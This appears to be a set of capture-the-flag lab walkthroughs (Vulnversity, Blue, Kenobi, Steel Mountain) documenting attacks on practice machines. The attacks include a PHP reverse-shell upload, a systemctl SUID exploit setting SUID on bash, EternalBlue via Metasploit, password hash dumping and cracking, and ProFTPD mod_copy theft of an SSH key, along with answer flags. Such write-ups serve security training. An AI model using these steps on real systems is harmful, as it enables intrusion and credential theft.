### Vulnversity

#### Task 2. Reconnaissance

1. Scan this box: `nmap -sV <machines ip>`
- nmap is an free, open-source and powerful tool used to discover hosts and services on a computer network. In our example, we are using nmap to scan this machine to identify all services that are running on a particular port. nmap has many capabilities, below is a table summarising some of the functionality it provides.


| Nmap flag     | Description          |
| -------- | -------------- |
| `-sV`| Attempts to determine the version of the services running |
| `-p <x> or -p` | Port scan for port <x> or scan all ports |
| `-Pn` | Disable host discovery and just scan for open ports |
| `-A` | Enables OS and version detection, executes in-build scripts for further enumeration  |
| `-sC` | Scan with the default nmap scripts |
| `-v` | Verbose mode|
| `-sU` | UDP port scan |
| `-sS` | TCP SYN port scan |


<hr></hr>

#### Task 3: Locating directories using GoBuster
- Using a fast directory discovery tool called GoBuster you will locate a directory that you can use to upload a shell to.

- GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories
- Now lets run GoBuster with a wordlist: `gobuster dir -u http://<ip>:3333 -w <word list location>`

| GoBuster flag     | Description          |
| -------- | -------------- |
| `-e`| Print the full URLs in your console |
|`-u`|The target URL|
|`-w`|Path to your wordlis|
|`-U and -P`|Username and Password for Basic Auth|
|-p|Proxy to use for requests|
|`-c <http cookies>	`|Specify a cookie for simulating your auth|

- command used:
    `gobuster dir -u http://10.10.4.155:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

    ![dirbuster-result](https://raw.githubusercontent.com/shashihacks/oscp-new/master/THM/Offensive%20path/assets/dirbuster.PNG?token=AD4TE55IQQZ24AJCJHV6YT3AO73KE)

```
> Directory found at /internal/
```

<hr></hr>
#### Task 4: Compromise the webserver

- Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server.

1. Try upload a few file types to the server, what common extension seems to be blocked?


1. To identify which extensions are not blocked, we're going to fuzz the upload form.
We're going to use Intruder (used for automating customised attacks).

To begin, make a wordlist with the following extensions in:
![extensions-list](https://i.imgur.com/ED153Nx.png)

Now make sure BurpSuite is configured to intercept all your browser traffic. Upload a file, once this request is captured, send it to the Intruder. Click on "Payloads" and select the "Sniper" attack type.

Click the "Positions" tab now, find the filename and "Add §" to the extension. It should look like so:
![burp-intruder](https://i.imgur.com/6dxnzq6.png)



1. Run this attack, what extension is allowed?
__Ans:__ `phtml`

Now we know what extension we can use for our payload we can progress.

We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and have your shell executed which will beacon out to you to control!

Download the following reverse PHP shell here.

To gain remote access to this machine, follow these steps:

Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to `<ip>` in the browser of your TryHackMe connected device).

Rename this file to php-reverse-shell.phtml

We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 1234

Upload your shell and navigate to `http://<ip>:3333/internal/uploads/php-reverse-shell.phtml` - This will execute your payload

You should see a connection on your netcat session
![net-cat connection- reverse_shell](https://i.imgur.com/FGcvTCp.png)

__Q:__ What is the name of the user who manages the webserver?  
``` bash
$ ls -al /home
total 12
drwxr-xr-x  3 root root 4096 Jul 31  2019 .
drwxr-xr-x 23 root root 4096 Jul 31  2019 ..
drwxr-xr-x  2 bill bill 4096 Jul 31  2019 bill
```
__Answer: bill__ 


```bash
$ cd /home/bill
$ ls
user.txt
$ cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```
- `8bd7992fbe8a6ad22a63361004cfcedb` is the user flag



#### Task 5: Privilege Escalation

Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).

In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.

![permissions](https://i.imgur.com/ZhaNR2p.jpg)

__Q:__ On the system, search for all SUID files. What file stands out?  

command used: `find / -perm -u=s -type f 2>/dev/null`
```bash
$ find / -perm -u=s -type f 2>/dev/null

/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl 
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```
__Ans:__ __/bin/systemctl__

- __systemd:__ Systemd is a software suite that provides fundamental building blocks for a Linux operating system. It includes the systemd “System and Service Manager”, an init system used to bootstrap user space and manage user processes. systemd aims to unify service configuration and behavior across Linux distributions.

```bash
# which systemctl
/bin/systemctl
```

__Note:__ *Systemctl is a systemd utility that is responsible for Controlling the systemd system and service manager. Systemd is a collection of system management daemons, utilities, and libraries which serves as a replacement of System V init daemon*

`systemctl`
**SUID**
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

source: https://gtfobins.github.io/
```bash
sudo install -m =xs $(which systemctl) . # this can be skipped

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"  
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF         # change this to systemctl path i.e., /bin/systemctl
./systemctl enable --now $TF # change this to systemctl path
```

- modified exploit to get root:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash" #set suid bit for /bin/bash
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

```
then:
```bash
$ bash -p
whoami
root
cd /root
ls
root.txt
cat root.txt    
a58ff8579f0a9270368d33a9966c7fd5
```

<hr></hr>



### Blue

**Title: Blue**
**Machine IP**: `10.10.38.119`
#### Task 1: Recon

__Q: How many ports are open with a port number under 1000?__  
__Ans:__ 3

```bash
┌──(kali@kali)-[~]
└─$ nmap -p1-1000 10.10.38.119      
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-08 14:01 EDT
Nmap scan report for 10.10.38.119
Host is up (0.037s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds

```

__Q:What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)__  
__Ans:__ `ms17-010`

```bash
└─$ nmap --script=vuln 10.10.38.119 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-08 14:02 EDT
Nmap scan report for 10.10.38.119
Host is up (0.042s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability                                                          
|     State: VULNERABLE                                                                                                       
|     IDs:  CVE:CVE-2012-0152                                                                                                  
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)                                                    
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.                
|                                                                                                                                                                                     
|_sslv2-drown: 
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 97.22 seconds
```


#### Task 2. Gain Access


__Q: Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)__  
-  For this run `msfconsole` nd search for `ms17_010`

```bash
msf6 > search ms17_010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

__Ans:__`exploit/windows/smb/ms17_010_eternalblue`

__Q:Show options and set the one required value. What is the name of this value?__
__A: RHOSTS__  

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.37.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
   ```


- Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

- set payload `windows/x64/shell/reverse_tcp`
- With that done, run the exploit!
- Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.  


#### Task 3: Escalate

Escalate privileges, learn how to upgrade shells in metasploit.

__Q__ If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)
__Ans__ `post/multi/manage/shell_to_meterpreter`

__Q: Select this (use MODULE_PATH). Show options, what option are we required to change?__  

__Ans: SESSION__
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > search "shell_to_"

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

msf6 exploit(windows/smb/ms17_010_eternalblue) > use 0
[*] Using configured payload windows/x64/shell/reverse_tcp
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on.

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
SESSION => 2
```

- Set the required option, you may need to list all of the sessions to find your target here. 

- Once the meterpreter shell conversion completes, select that session for use.

- Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 


 ``` bash
meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

```

- Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.


#### Task 4: Cracking
- Dump the non-default user's password and crack it!


__Q:Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?__  


```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

__Ans: Jon__

__Q: Copy this password hash to a file and research how to crack it. What is the cracked password?__  
__A: alqfna22__


```bash
┌──(kali@kali)-[~/tryhackme/blue]
└─$ john  passwords.txt  --format=NT   --wordlist=rockyou.txt                                                                      1 ⨯
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])
No password hashes left to crack (see FAQ)
                                                                                                                                       
┌──(kali@kali)-[~/tryhackme/blue]
└─$ john  passwords.txt  --format=NT   --show                
Administrator::500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:alqfna22:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

3 password hashes cracked, 0 left
```

#### Task 5: Find flags!

__Q:Flag1? This flag can be found at the system root.__  
__Ans: flag{access_the_machine}__ found in `C` drive as it is the root in windows

```bash
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
07/13/2009  10:20 PM    <DIR>          PerfLogs
04/12/2011  03:28 AM    <DIR>          Program Files
03/17/2019  05:28 PM    <DIR>          Program Files (x86)
12/12/2018  10:13 PM    <DIR>          Users
03/17/2019  05:36 PM    <DIR>          Windows
               1 File(s)             24 bytes
               5 Dir(s)  20,446,679,040 bytes free

C:\>type flag1.txt
type flag1.txt
flag{access_the_machine}

```

__Q:Flag2? This flag can be found at the location where passwords are stored within Windows.__  
__Ans: flag{sam_database_elevated_access}__ found in `C:\Windows\System32\config` where SAM file is located

*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.

``` bash
C:\Windows\System32\config>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Windows\System32\config

04/08/2021  12:56 PM    <DIR>          .
04/08/2021  12:56 PM    <DIR>          ..
12/12/2018  06:00 PM            28,672 BCD-Template
04/08/2021  01:06 PM        18,087,936 COMPONENTS
04/08/2021  01:26 PM           262,144 DEFAULT
03/17/2019  02:32 PM                34 flag2.txt
07/13/2009  09:34 PM    <DIR>          Journal
04/08/2021  01:25 PM    <DIR>          RegBack
03/17/2019  03:05 PM           262,144 SAM
04/08/2021  01:06 PM           262,144 SECURITY
04/08/2021  01:33 PM        40,632,320 SOFTWARE
04/08/2021  02:00 PM        12,582,912 SYSTEM
11/20/2010  09:41 PM    <DIR>          systemprofile
12/12/2018  06:03 PM    <DIR>          TxR
               8 File(s)     72,118,306 bytes
               6 Dir(s)  20,446,674,944 bytes free

C:\Windows\System32\config>type flag2.txt 
type flag2.txt
flag{sam_database_elevated_access}
```


__Q: flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.__  

__A: flag{admin_documents_can_be_valuable}__ found in `C:\Users\Jon\Documents`

```bash
C:\Users\Jon\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\Documents

12/12/2018  10:49 PM    <DIR>          .
12/12/2018  10:49 PM    <DIR>          ..
03/17/2019  02:26 PM                37 flag3.txt
               1 File(s)             37 bytes
               2 Dir(s)  20,446,670,848 bytes free

C:\Users\Jon\Documents>type flag3.txt
type flag3.txt
flag{admin_documents_can_be_valuable}
```

<hr>

### Kenobi

#### Task 1: Deploying
- This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

__Q: Scan the machine with nmap, how many ports are open?__  
__Ans: 7__

```bash

─$ nmap -p- 10.10.81.16
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-08 17:33 EDT
Nmap scan report for 10.10.81.16
Host is up (0.036s latency).
Not shown: 65524 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
35473/tcp open  unknown
42269/tcp open  unknown
43893/tcp open  unknown
59531/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 49.79 seconds
```

#### Task 2: Enumerating Samba for shares

- Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

- Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.
- Using nmap we can enumerate a machine for SMB shares.

  - Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

   - `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.81.16`

- SMB has two ports, **445** and **139**.

![SMB](https://i.imgur.com/bkgVNy3.png)

__Q: Using the nmap command above, how many shares have been found?__  
__A: 3__
```bash
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.81.16
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-08 17:40 EDT
Nmap scan report for 10.10.81.16
Host is up (0.049s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.81.16\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.81.16\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.81.16\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 6.65 second
```

- On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.
`smbclient //<ip>/anonymous`
- Using your machine, connect to the machines network share.

```bash
└─$ smbclient //10.10.81.16/anonymous
Enter WORKGROUP\kali's password:       # just press enter, No Password
Try "help" to get a list of possible commands.
smb: \> 
```
__Q: Once you're connected, list the files on the share. What is the file can you see?__.  
__A: log.txt__

```bash
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877112 blocks available
```
You can recursively download the SMB share too. Submit the username and password as nothing.
`smbget -R smb://<ip>/anonymous`

Open the file on the share. There is a few interesting things found.

- Information generated for Kenobi when generating an SSH key for the user
- Information about the ProFTPD server.

__Q: What port is FTP running on?__
__Ans__ 21 (can be found in downloaded log.txt file)  

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.159.177`

__Q: What mount can we see?__
__Ans__ `/var`  

```bash
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.159.177
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 17:10 EDT
Nmap scan report for 10.10.159.177
Host is up (0.038s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
```


#### Task 3. Gain initial access with ProFtpd  

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

```bash
└─$ nc  10.10.159.177 21                                                                                                                      1 ⨯
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.159.177]
```
__Q: What is the version?__
__Ans: 1.3.5__

- We can use searchsploit to find exploits for a particular software version.
- Searchsploit is basically just a command line search tool for exploit-db.com.

```bash
└─$ searchsploit "ProFTPd 1.3.5"
---------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                       | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                             | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                                       | linux/remote/36742.txt
---------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
__Q: How many exploits are there for the ProFTPd running?__
__Ans: 3__

The mod_copy module implements __SITE CPFR__ and __SITE CPTO__ commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the sha
We're now going to copy Kenobi's private key using __SITE CPFR__ and __SITE CPT__ commands.

```bash
└─$ nc 10.10.159.177 21 
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.159.177]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```
We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the `/var/tmp` directory.

- Lets mount the /var/tmp directory to our machine

    - `mkdir /mnt/kenobiNFS`
    - `mount machine_ip:/var /mnt/kenobiNFS`
    - `ls -la /mnt/kenobiNFS`

```bash
$ sudo mount 10.10.159.177:/var /mnt/kenobiNFS  # mounts var to /mnt/kenobiNFS directory
$ ls -la /mnt/kenobiNFS 
total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 Apr 13 17:28 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 Apr 13 17:24 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www
```
```bash
└─$ cp /mnt/kenobiNFS/tmp/id_rsa .
```
```bash
$ ls                                               
id_rsa
```
```bash
$ sudo chmod 600 id_rsa 
$ ssh -i id_rsa kenobi@10.10.159.177
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
```


#### Task.4  Privilege Escalation with Path Variable Manipulation

![permissions](https://i.imgur.com/LN2uOCJ.png)

| Permission     | on Files     | On Directories
| -------- | -------------- | -----|
| SUID Bit	| User executes the file with permissions of the file owner	 | |
|SGID Bit	|User executes the file with the permission of the group owner.|File created in directory gets the same group owner.
|Sticky Bit	|No meaning	|Users are prevented from deleting files from other users.

SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: `find / -perm -u=s -type f 2>/dev/null`





### Steel Mountain

#### Task 1.  Introduction

In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

__Q: Who is the employee of the month? (Hint: Reverse image search)__
__Ans: Bill Harper__


#### Task 2. Initial Access


__Q: Scan the machine with nmap. What is the other port running a web server on?__
__Ans: Rejetto HTTP File Server__(can be found in website running on port:80)

__Q: What is the CVE number to exploit this file server?__
__Ans: 2014-6287__

__Q: Use Metasploit to get an initial shell. What is the user flag?__
__Ans: b04763b6fcf51fcd7c13abc7db4fd365__ (found in `C:\Users\bill\Desktop`)



#### task 3. Privilege Escalation

Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!

To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

You can download the script (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). Now you can use the upload command in Metasploit to upload the script.






<br></br><br></br><br></br><br></br><br></br><br></br><br></br><br></br>

